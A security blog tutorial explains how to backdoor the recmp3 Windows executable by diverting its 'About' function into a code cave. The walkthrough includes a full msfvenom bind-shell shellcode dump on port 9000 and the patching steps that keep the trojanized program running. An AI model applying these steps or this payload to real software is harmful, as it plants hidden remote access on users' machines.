---
layout: post
title: Backdooring PE Files through Code Caves + User Interaction + Encoding (VOL:II)
date: 2020-03-08 18:00:00
categories: posts
comments: false
en: true
---

### Introduction

You find yourself reading the second volume of the "PE File Backdooring" series. As a result of such, I highly recommend reading the first [one](https://whitecr0wz.github.io/posts/Backdooring-PE/), as it may help understanding the shown material on this post.

Today, I will be explaining how to backdoor PE Files with the addition of user interaction and encoding as well. Furthermore, in order to replay the concept, the application [recmp3](https://sourceforge.net/projects/recmp3/) will be used, as it is a lightweight program which has several Code Caves with ASLR disabled within the affected zone. 

![](/assets/img/Code_Cave_II/1.png)
###### recmp3 when executed.

Let's check the available Code Caves.

```term
C:\Users\IEUser\AppData\Local\Programs\Python\Python38-32>python.exe pycave.py -
f "C:\Users\IEUser\Desktop2\RadioRecord\RadioRecord.exe"
[+] Minimum code cave size: 300
[+] Image Base:  0x00400000
[+] Loading "C:\Users\IEUser\Desktop2\RadioRecord\RadioRecord.exe"...

[+] Looking for code caves...
[+] Code cave found in .data            Size: 559 bytes         RA: 0x000A3E79
VA: 0x004A3E79
[+] Code cave found in .data            Size: 8195 bytes        RA: 0x000A41FD
VA: 0x004A41FD
[+] Code cave found in .rsrc            Size: 513 bytes         RA: 0x000A94AF
VA: 0x004C24AF
[+] Code cave found in .rsrc            Size: 513 bytes         RA: 0x000A9A27
VA: 0x004C2A27

C:\Users\IEUser\AppData\Local\Programs\Python\Python38-32>
```

0x004A41FD seems rather juicy, with more than 5000+ bytes! This code cave seems rather interesting.

##### When the fun begins.

As we desire to make the PE File execute shellcode when interacted with in a certain manner, it is required to discover a place to intervene with the flow. For example, if we check the option "About", the program displays the following. 

![](/assets/img/Code_Cave_II/2.png)

As it is seen, this allows us to gather information of the program and its author. We can use this function to our advantage. Let's investigate this function in Immunity.

In order to find such, the option "Search For > All referenced text strings" will be used. This will search for all text strings that are somehow being used or pushed into the stack.

![](/assets/img/Code_Cave_II/3.png)

It is gone to the top in order to search for a key phrase, such as for example, "sourceforge".

![](/assets/img/Code_Cave_II/4.png)

![](/assets/img/Code_Cave_II/5.png)

![](/assets/img/Code_Cave_II/6.png)

Immunity seems to have given us the desired result. Similarly to the previous blog post, the following step is to replace a specific address that is being executed when the function is processed with a JMP instruction pointing to our code cave. In addition with this, when we finish with our shellcode and aligning the stack, the overwriten address is executed once again and a JMP instruction is placed pointing to the original flow.

In this case, I will replace the PUSH instruction that gives us the information. Moreover, the instructions will be saved so that they are re-assigned later on.

![](/assets/img/Code_Cave_II/7.png)

The next step; assembling a JMP address to our code cave at 0x004A41FD, at the same time overwriting the address at 0x00403426.

![](/assets/img/Code_Cave_II/8.png)

Good, this is then saved as in the previous post through "Copy to Executable" into a new file. 
Furthermore, if we now make use of the option "About" once again, the flow will be redirected to the code cave.

![](/assets/img/Code_Cave_II/9.gif)

Now, in contemplation of jumping to the code cave without any difficulty,the bytes prior and after 0x004A41FD will be replaced by NOPs.

![](/assets/img/Code_Cave_II/10.png)

![](/assets/img/Code_Cave_II/11.png)

Similarly to VOL:I of the series, the order of our payload is the following:

+ PUSHAD/PUSHFD instructions. These will save our registers/flags so that they are aligned later on. It is essential for the registers/flags to be aligned so that the instructions work perfectly according to the value of these.
+ The Shellcode. Shellcode, we are used to it. Some modifications may need to be issued, such as the removal of the last instruction in some cases, as it tends to crash the flow and the modification of a byte which waits for the shellcode to exit for the main program to return its original flow.
+ Alignment. The ESP Register must be restored to its old value.
+ POPFD/POPAD. These instructions will restore our registers/flags.
+ As when assembling the JMP on the entry point instruction some other instructions were replaced, these must be assembled once again so that the code runs as intended and does not crash!
+ A JMP instruction pointing towards the following instruction after the replaced ones within the original function. In this case, it will be 0x0040342B.

Remembering this order, the PUSHAD/PUSHFD instructions are assembled.

![](/assets/img/Code_Cave_II/12.png)

The payload used will be the same as the previous, a unstaged bind shell that will display at port 9000.

Generating the payload.

```term
root@whitecr0wz:~# msfvenom -p windows/shell_bind_tcp LPORT=9000 -f hex 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 328 bytes
Final size of hex file: 656 bytes
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd4050405068ea0fdfe0ffd597680200232889e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
root@whitecr0wz:~# 
```

The shellcode is pasted with "Binary paste".

![](/assets/img/Code_Cave_II/13.png)

![](/assets/img/Code_Cave_II/14.png)

DEC ESI is replaced for a NOP, this is done so that it allows the execution to continue after the shell is established.

![](/assets/img/Code_Cave_II/15.png)

![](/assets/img/Code_Cave_II/16.png)

The final CALL EBP is removed as it would completely demolish the flow. Instead, the stack alignment is placed, which is the same that in the aforementioned post, as the payload is exactly the same.

![](/assets/img/Code_Cave_II/17.png)

The stack alignment is placed.

![](/assets/img/Code_Cave_II/18.png)

The POPAD/POPFD instructions are placed.

![](/assets/img/Code_Cave_II/19.png)

The PUSH address is re-assigned.

![](/assets/img/Code_Cave_II/20.png)

The JMP address pointing to 0x0040342B is assembled.

![](/assets/img/Code_Cave_II/21.png)

#### EndGame #1
